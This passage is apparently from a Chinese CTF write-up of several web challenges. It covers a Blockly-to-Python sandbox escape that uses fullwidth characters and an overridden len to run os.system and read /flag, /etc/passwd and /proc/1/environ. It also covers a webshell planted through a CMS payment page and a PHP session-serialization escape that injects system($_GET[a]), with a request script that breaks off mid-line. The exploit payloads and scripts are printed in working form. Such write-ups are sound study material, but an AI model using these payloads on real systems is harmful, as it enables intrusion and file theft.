class="line">            code = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> block_type == <span class="string">&#x27;text&#x27;</span>:</span><br><span class="line">        <span class="keyword">if</span> check_for_blacklisted_symbols(block[<span class="string">&#x27;fields&#x27;</span>][<span class="string">&#x27;TEXT&#x27;</span>]):</span><br><span class="line">            code = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">        </span><br><span class="line">            code =  <span class="string">&quot;&#x27;&quot;</span> + unidecode.unidecode(block[<span class="string">&#x27;fields&#x27;</span>][<span class="string">&#x27;TEXT&#x27;</span>]) + <span class="string">&quot;&#x27;&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> block_type == <span class="string">&#x27;max&#x27;</span>:</span><br><span class="line">        </span><br><span class="line">        a_block = block[<span class="string">&#x27;inputs&#x27;</span>][<span class="string">&#x27;A&#x27;</span>][<span class="string">&#x27;block&#x27;</span>]</span><br><span class="line">        b_block = block[<span class="string">&#x27;inputs&#x27;</span>][<span class="string">&#x27;B&#x27;</span>][<span class="string">&#x27;block&#x27;</span>]</span><br><span class="line">        a = block_to_python(a_block)  </span><br><span class="line">        b = block_to_python(b_block)</span><br><span class="line">        code =  <span class="string">f&quot;max(<span class="subst">&#123;a&#125;</span>, <span class="subst">&#123;b&#125;</span>)&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">elif</span> block_type == <span class="string">&#x27;min&#x27;</span>:</span><br><span class="line">        a_block = block[<span class="string">&#x27;inputs&#x27;</span>][<span class="string">&#x27;A&#x27;</span>][<span class="string">&#x27;block&#x27;</span>]</span><br><span class="line">        b_block = block[<span class="string">&#x27;inputs&#x27;</span>][<span class="string">&#x27;B&#x27;</span>][<span class="string">&#x27;block&#x27;</span>]</span><br><span class="line">        a = block_to_python(a_block)</span><br><span class="line">        b = block_to_python(b_block)</span><br><span class="line">        code =  <span class="string">f&quot;min(<span class="subst">&#123;a&#125;</span>, <span class="subst">&#123;b&#125;</span>)&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;next&#x27;</span> <span class="keyword">in</span> block:</span><br><span class="line">        </span><br><span class="line">        block = block[<span class="string">&#x27;next&#x27;</span>][<span class="string">&#x27;block&#x27;</span>]</span><br><span class="line">        </span><br><span class="line">        code +=<span class="string">&quot;\n&quot;</span> + block_to_python(block)+ <span class="string">&quot;\n&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> code </span><br><span class="line">    <span class="keyword">return</span> code</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">json_to_python</span>(<span class="params">blockly_data</span>):</span><br><span class="line">    block = blockly_data[<span class="string">&#x27;blocks&#x27;</span>][<span class="string">&#x27;blocks&#x27;</span>][<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    python_code = <span class="string">&quot;&quot;</span></span><br><span class="line">    python_code += block_to_python(block) + <span class="string">&quot;\n&quot;</span></span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">    <span class="keyword">return</span> python_code</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">do</span>(<span class="params">source_code</span>):</span><br><span class="line">    hook_code = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">def my_audit_hook(event_name, arg):</span></span><br><span class="line"><span class="string">    blacklist = [&quot;popen&quot;, &quot;input&quot;, &quot;eval&quot;, &quot;exec&quot;, &quot;compile&quot;, &quot;memoryview&quot;]</span></span><br><span class="line"><span class="string">    if len(event_name) &gt; 4:</span></span><br><span class="line"><span class="string">        raise RuntimeError(&quot;Too Long!&quot;)</span></span><br><span class="line"><span class="string">    for bad in blacklist:</span></span><br><span class="line"><span class="string">        if bad in event_name:</span></span><br><span class="line"><span class="string">            raise RuntimeError(&quot;No!&quot;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">__import__(&#x27;sys&#x27;).addaudithook(my_audit_hook)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(source_code)</span><br><span class="line">    code = hook_code + source_code</span><br><span class="line">    tree = <span class="built_in">compile</span>(source_code, <span class="string">&quot;run.py&quot;</span>, <span class="string">&#x27;exec&#x27;</span>, flags=ast.PyCF_ONLY_AST)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> verify_secure(tree):  </span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;run.py&quot;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                f.write(code)        </span><br><span class="line">            result = subprocess.run([<span class="string">&#x27;python&#x27;</span>, <span class="string">&#x27;run.py&#x27;</span>], stdout=subprocess.PIPE, timeout=<span class="number">5</span>).stdout.decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">            os.remove(<span class="string">&#x27;run.py&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> result</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Execution aborted due to security concerns.&quot;</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        os.remove(<span class="string">&#x27;run.py&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Timeout!&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> app.send_static_file(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/blockly_json&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">blockly_json</span>():</span><br><span class="line">    blockly_data = request.get_data()</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">type</span>(blockly_data))</span><br><span class="line">    blockly_data = json.loads(blockly_data.decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    <span class="built_in">print</span>(blockly_data)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        python_code = json_to_python(blockly_data)</span><br><span class="line">        <span class="keyword">return</span> do(python_code)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;Error generating Python code&quot;</span>, <span class="string">&quot;details&quot;</span>: <span class="built_in">str</span>(e)&#125;)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host = <span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>首先一进来这个黑名单过滤了很多符号(所有)，除了空格大小写字母数字</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">module_exists</span>(<span class="params">module_name</span>):</span><br><span class="line"></span><br><span class="line">    spec = importlib.util.find_spec(module_name)</span><br><span class="line">    <span class="keyword">if</span> spec <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> module_name <span class="keyword">in</span> sys.builtin_module_names:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> spec.origin:</span><br><span class="line">        std_lib_path = os.path.dirname(os.__file__)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> spec.origin.startswith(std_lib_path) <span class="keyword">and</span> <span class="keyword">not</span> spec.origin.startswith(os.getcwd()):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure>

<p>判断函数是否为内置模块，如果为自定义模块则返回<code>False</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">verify_secure</span>(<span class="params">m</span>):</span><br><span class="line">    <span class="keyword">for</span> node <span class="keyword">in</span> ast.walk(m):</span><br><span class="line">        <span class="keyword">match</span> <span class="built_in">type</span>(node):</span><br><span class="line">            <span class="keyword">case</span> ast.Import:  </span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;ERROR: Banned module &quot;</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">            <span class="keyword">case</span> ast.ImportFrom: </span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;ERROR: Banned module <span class="subst">&#123;node.module&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br></pre></td></tr></table></figure>

<p>判断是否有导入语句，<code>AST</code>为一个标准库</p>
<p>然后就是两个来进行代码处理的函数，重点是这里</p>
<p><img src="/../images/achieve/202411/%E5%BC%BA%E7%BD%91%E6%9D%AF2024/QQ20241102-202753.png" alt="1"></p>
<p>进行了代码的执行，其中我们绕过关键词即可，现在的问题就是插入恶意代码以及绕过了</p>
<p>现在我们知道发包的格式类似于这种</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;blocks&quot;: &#123;</span><br><span class="line">    &quot;languageVersion&quot;: 0,</span><br><span class="line">    &quot;blocks&quot;: [</span><br><span class="line">      &#123;</span><br><span class="line">        &quot;type&quot;: &quot;print&quot;,</span><br><span class="line">        &quot;id&quot;: &quot;1&quot;,</span><br><span class="line">        &quot;inputs&quot;: &#123;</span><br><span class="line">          &quot;TEXT&quot;: &#123;</span><br><span class="line">            &quot;block&quot;: &#123;</span><br><span class="line">              &quot;type&quot;: &quot;text&quot;,</span><br><span class="line">              &quot;id&quot;: &quot;2&quot;,</span><br><span class="line">              &quot;fields&quot;: &#123;</span><br><span class="line">                &quot;TEXT&quot;: &quot;Hello, World!&quot;</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但是读取文件这里又卡住了，这里不让有的关键词如何绕过，还有就是文件读取命令使用什么</p>
<p>后面查看自己的CTFshow之前的记录发现可以使用半角符号来绕过关键词，读取命令用这个</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@dkcjbRCL8kgaNGz:~# dd if=/flag</span><br><span class="line">flag&#123;I_love_Yo3&#125;</span><br><span class="line">0+1 records in</span><br><span class="line">0+1 records out</span><br><span class="line">17 bytes copied, 3.9533e-05 s, 430 kB/s</span><br></pre></td></tr></table></figure>

<p>但是后面发现这个payload我这么写都写不好，八进制绕过给我爆500，然后上网搜索有没有内置的读取文件的<strong>Flask中内置的读取文件方法</strong></p>
<p>找到<code>get_data</code>方法</p>
<p>转半角脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">half2full</span>(<span class="params">half</span>):</span><br><span class="line">    full = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> half:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">ord</span>(ch) <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>, <span class="number">127</span>):</span><br><span class="line">            ch = <span class="built_in">chr</span>(<span class="built_in">ord</span>(ch) + <span class="number">0xfee0</span>)</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">ord</span>(ch) == <span class="number">32</span>:</span><br><span class="line">            ch = <span class="built_in">chr</span>(<span class="number">0x3000</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        full += ch</span><br><span class="line">    <span class="keyword">return</span> full</span><br><span class="line">t=<span class="string">&#x27;&#x27;</span></span><br><span class="line">s=<span class="string">&quot;1&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">    t+=half2full(i)</span><br><span class="line"><span class="built_in">print</span>(t)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;blocks&quot;: &#123;</span><br><span class="line">    &quot;blocks&quot;: [</span><br><span class="line">      &#123;</span><br><span class="line">        &quot;type&quot;: &quot;print&quot;,</span><br><span class="line">        &quot;inputs&quot;: &#123;</span><br><span class="line">          &quot;TEXT&quot;: &#123;</span><br><span class="line">            &quot;block&quot;: &#123;</span><br><span class="line">              &quot;type&quot;: &quot;text&quot;,</span><br><span class="line">              &quot;fields&quot;: &#123;</span><br><span class="line">                &quot;TEXT&quot;: &quot;123‘，ｇｅｔａｔｔｒ（＂＂．＿＿ｃｌａｓｓ＿＿．＿＿ｂａｓｅｓ＿＿．＿＿ｇｅｔｉｔｅｍ＿＿（０）．＿＿ｓｕｂｃｌａｓｓｅｓ＿＿（）［１２１］， ＂ｇｅｔ＿ｄａｔａ＂）（１， ＂／ｅｔｃ／ｐａｓｓｗｄ＂），’&quot;</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;blocks&quot;: &#123;</span><br><span class="line">    &quot;blocks&quot;: [</span><br><span class="line">      &#123;</span><br><span class="line">        &quot;type&quot;: &quot;print&quot;,</span><br><span class="line">        &quot;inputs&quot;: &#123;</span><br><span class="line">          &quot;TEXT&quot;: &#123;</span><br><span class="line">            &quot;block&quot;: &#123;</span><br><span class="line">              &quot;type&quot;: &quot;text&quot;,</span><br><span class="line">              &quot;fields&quot;: &#123;</span><br><span class="line">                &quot;TEXT&quot;: &quot;123‘，ｇｅｔａｔｔｒ（＂＂．＿＿ｃｌａｓｓ＿＿．＿＿ｂａｓｅｓ＿＿．＿＿ｇｅｔｉｔｅｍ＿＿（０）．＿＿ｓｕｂｃｌａｓｓｅｓ＿＿（）［１２１］， ＂ｇｅｔ＿ｄａｔａ＂）（１， ＂／ｐｒｏｃ／１／ｅｎｖｉｒｏｎ＂），’&quot;</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>还是搞不到，难道还是要命令执行才可以吗</p>
<p>题目中说了<code>len</code>不能超过4，这里直接重写<code>len</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST /blockly_json HTTP/1.1</span><br><span class="line">Host: eci-2zefm3fmppqf7kdz1ghu.cloudeci1.ichunqiu.com:5000</span><br><span class="line">Content-Length: 317</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36</span><br><span class="line">Accept: */*</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Origin: http://eci-2zefm3fmppqf7kdz1ghu.cloudeci1.ichunqiu.com:5000</span><br><span class="line">Referer: http://eci-2zefm3fmppqf7kdz1ghu.cloudeci1.ichunqiu.com:5000/</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line">Cookie: Hm_lvt_2d0601bd28de7d49818249cf35d95943=1728270163,1728484327,1728520102,1728911088</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">&#123;&quot;blocks&quot;:&#123;&quot;languageVersion&quot;:0,&quot;blocks&quot;:[&#123;&quot;type&quot;:&quot;text&quot;,&quot;id&quot;:&quot;Yl.b$Wv5$31H:nQG/2fi&quot;,&quot;x&quot;:0,&quot;y&quot;:181,&quot;fields&quot;:&#123;&quot;TEXT&quot;:&quot;‘；＿＿import＿＿（”builtins”）。len＝lambda a：4；’‘；＿＿import＿＿（”os”）。system（”＄（printf ‘ｄｄ　ｉｆ＝／ｆｌａｇ’）； ”）；’&quot;&#125;&#125;]&#125;&#125;</span><br></pre></td></tr></table></figure>

<h2 id="xiaohuanxiong"><a href="#xiaohuanxiong" class="headerlink" title="xiaohuanxiong"></a>xiaohuanxiong</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">V5.1.35 LTS &#123; 十年磨一剑-为API开发设计的高性能框架 &#125;</span><br></pre></td></tr></table></figure>

<p>是一个tp，进来之后先安装，然后等待一会儿，管他的先扫吧</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">[10:09:00] 200 -    1KB - /admin/login                                      </span><br><span class="line">[10:09:00] 200 -    1KB - /admin/login.html                                 </span><br><span class="line">[10:09:00] 200 -    1KB - /Admin/login/</span><br><span class="line">[10:14:20] 200 -    1KB - /login                                            </span><br><span class="line">[10:14:21] 200 -    1KB - /login.html                                       </span><br><span class="line">[10:14:22] 200 -    1KB - /login/                                           </span><br><span class="line">[10:14:22] 200 -    1KB - /login/admin/</span><br><span class="line">[10:14:23] 200 -    1KB - /login/admin/admin.asp                            </span><br><span class="line">[10:14:23] 200 -    1KB - /login/administrator/</span><br><span class="line">[10:14:23] 200 -    1KB - /login/cpanel.php</span><br><span class="line">[10:14:23] 200 -    1KB - /login/cpanel.aspx</span><br><span class="line">[10:14:23] 200 -    1KB - /login/cpanel.html</span><br><span class="line">[10:14:23] 200 -    1KB - /login/cpanel.jsp</span><br><span class="line">[10:14:23] 200 -    1KB - /login/cpanel.js</span><br><span class="line">[10:14:23] 200 -    1KB - /login/cpanel/</span><br><span class="line">[10:14:23] 200 -    1KB - /login/index</span><br><span class="line">[10:14:23] 200 -    1KB - /login/login</span><br><span class="line">[10:14:23] 200 -    1KB - /login/oauth/</span><br><span class="line">[10:14:23] 200 -    1KB - /login/super</span><br><span class="line">[10:14:29] 200 -  899B  - /logout                                           </span><br><span class="line">[10:14:29] 200 -  899B  - /logout.html                                      </span><br><span class="line">[10:14:29] 200 -  899B  - /logout/                                          </span><br><span class="line">[10:15:29] 200 -    1KB - /register                                         </span><br><span class="line">[10:15:29] 200 -    1KB - /register.html                                    </span><br><span class="line">[10:15:30] 200 -   24B  - /robots.txt                                       </span><br><span class="line">[10:15:31] 200 -    2KB - /search                                           </span><br><span class="line">[10:15:31] 200 -    2KB - /search.php                                       </span><br><span class="line">[10:15:31] 200 -    2KB - /search.js</span><br><span class="line">[10:15:31] 200 -    2KB - /search.html</span><br><span class="line">[10:15:31] 200 -    2KB - /search.aspx                                      </span><br><span class="line">[10:15:31] 200 -    2KB - /search.jsp</span><br><span class="line">[10:15:31] 200 -    2KB - /search_admin</span><br><span class="line">[10:15:31] 200 -    2KB - /searchreplacedb2.php                             </span><br><span class="line">[10:15:31] 200 -    2KB - /searchresults.aspx                               </span><br><span class="line">[10:15:31] 200 -    2KB - /searchresults.html</span><br><span class="line">[10:15:31] 200 -    2KB - /searchresults.php</span><br><span class="line">[10:15:31] 200 -    2KB - /searchresults.js</span><br><span class="line">[10:15:31] 200 -    2KB - /searchreplacedb2cli.php</span><br><span class="line">[10:15:31] 200 -    2KB - /searchresults.jsp</span><br></pre></td></tr></table></figure>

<p>扫的确实慢了点不过心急吃不了热豆腐，接着搞，发现<code>admin/Admins</code>，这里发现支付可以添加PHP代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/admin/payment/index.html</span><br></pre></td></tr></table></figure>

<p>直接添加一句话木马，但是我发现有个小细节就是必须加不能报错和引号，不然就无法使用，加完直接返回漫画主页就已经getshell了</p>
<p>难得就在于拿到<code>admin/Admins</code>这个路由，御剑是可以爆破出来的</p>
<h2 id="platform"><a href="#platform" class="headerlink" title="platform"></a>platform</h2><p>扫出来源码<code>www.zip</code></p>
<p>拿到之后是一个PHP。我们慢慢看</p>
<p><img src="/../images/achieve/202411/%E5%BC%BA%E7%BD%91%E6%9D%AF2024/QQ20241103-001006.png" alt="1"></p>
<p>看到这里之后发现直接就是在<code>class.php</code>，但是有session，可能有竞争？</p>
<p>后来想想这里不是有个空值嘛</p>
<p><img src="/../images/achieve/202411/%E5%BC%BA%E7%BD%91%E6%9D%AF2024/QQ20241103-091841.png" alt="1"></p>
<p>经过测试发现怎么弄都会是56个字符</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&quot;;session_key|s:20:&quot;FIzIiMb901w1XCmMXvui&quot;;password|s:99:</span><br><span class="line"></span><br><span class="line">&quot;;session_key|s:19:&quot;kkTEOXdlrTsA7fOnDWI&quot;;password|s:106:</span><br></pre></td></tr></table></figure>

<p>于是这里我们进行逃逸即可</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&quot;passthru&quot;</span>*<span class="number">7</span>)</span><br></pre></td></tr></table></figure>

<p>然后再插入我们的session序列化poc</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;session_key|O:15:&quot;notouchitsclass&quot;:1:&#123;s:4:&quot;data&quot;;s:24:&quot;(&quot;sys&quot;.&quot;tem&quot;)($_GET[a]);&quot;;&#125;password|s:2:&quot;wi</span><br></pre></td></tr></table></figure>

<p>当然这里如果是脚本的话肯定是要http头的</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept-Language&#x27;</span>: <span class="string">&#x27;zh-CN,zh;q=0.9&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Cache-Control&#x27;</span>: <span class="string">&#x27;no-cache&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Pragma&#x27;</span>: <span class="string">&#x27;no-cache&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Proxy-Connection&#x27;</span>: <span class="string">&#x27;keep-alive&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Upgrade-Insecure-Requests&#x27;</span>: <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">params = &#123;</span><br><span class="line">    <span class="string">&#x27;a&#x27;</span>: <span class="string">&quot;/readflag&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">  <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;;session_key|O:15:&quot;notouchitsclass&quot;:1:&#123;s:4:&quot;data&quot;;s:24:&quot;(&quot;sys&quot;.&quot;tem&quot;)($_GET[a]);&quot;;&#125;password|s:2:&quot;wi&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;passthrupassthrupassthrupassthrupassthrupassthrupassthru&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://eci-2zebwi4k2x5ugkdi45iw.cloudeci1.ichunqiu.com/&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    r = requests.session()</span><br><span class="line">    response1 = r.post(url+<span class="string">&#x27;/index.php&#x27;</span>, headers=headers, data=data, verify=<span class="literal">False</span>, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">    response2 = r.post(url+<span 